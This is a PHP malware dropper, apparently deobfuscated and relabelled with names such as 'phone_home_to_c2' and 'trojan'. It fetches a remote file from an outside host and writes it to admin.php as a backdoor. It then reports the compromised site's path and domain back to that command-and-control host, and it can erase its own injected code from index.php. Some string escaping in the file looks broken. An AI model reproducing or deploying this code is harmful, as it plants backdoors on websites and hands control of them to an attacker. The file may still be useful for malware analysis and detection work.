<?php

function get_victim_domain($default_domain = '') {
    if (isset(${"_SERVER"}["HTTP_HOST"])) {
        return ${"_SERVER"}["HTTP_HOST"];
    } else if(isset(${"_SERVER"}["SERVER_NAME"])) {
        return ${"_SERVER"}["SERVER_NAME"];
    }
    return $default_domain;
}

function phone_home_to_c2($url) {
    $file_contents = @file_get_contents($url);
    if (!$file_contents) {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $file_contents = curl_exec($curl);
        curl_close($curl);
    }
    return $file_contents;
}

function main() {
    $obj = array();
    $obj["path"] = str_replace(str_replace(\'\', \'/\\', ${"_SERVER"}["PHP_SELF"]), \'\\', str_replace(\'\\\\\\\\\',\'/\\', ${"_SERVER"}["SCRIPT_FILENAME"]));
    
    $obj["domain"] = get_victim_domain();
    $obj["shell_link"] = "https://<victim domain>/about.php?520";
    if (isset(${"_GET"}["del"]) && ${"_GET"}["del"] == "my_code") {
        $path_to_root_index = $obj["path"] . "/index.php";
        $file_contents = @file_get_contents($path_to_root_index);
        $php_file_pattern = "<\?php.+\(1\);\?>";
        $file_contents = preg_replace("/$php_file_pattern/si",\'\\' , $file_contents);
        $file_contents = @file_put_contents($path_to_root_index, $file_contents);
        if ($file_contents > 0) {
            die("delete success");
        }
        die("delete failed");
    }
    $adminphp_path = $obj["path"] . "/admin.php";
    $file_contents = @phone_home_to_c2("http://51la.izv3.com/a.txt");
    $file_contents = @file_put_contents($adminphp_path, $file_contents);
    if ($file_contents>0) {
        $obj["trojan"] = "http://" . $obj["domain"] . "/admin.php";
    } else {
        $obj["trojan"] = "write failed";
    }
    $build_c2_callback_url = sprintf("http://51la.izv3.com/?d=%s", base64_encode(serialize($obj)));
    $c2_response = phone_home_to_c2($build_c2_callback_url);
    if ($c2_response == "done") {
        $path_to_root_index = $obj["path"] . "/index.php";
        $file_contents = @file_get_contents($path_to_root_index);
        $php_file_pattern = "<\?php.+\(1\);\?>";
        $file_contents = preg_replace("/$php_file_pattern/si", \'\\', $file_contents);
        @file_put_contents($path_to_root_index, $file_contents);
    }
}

main();
?>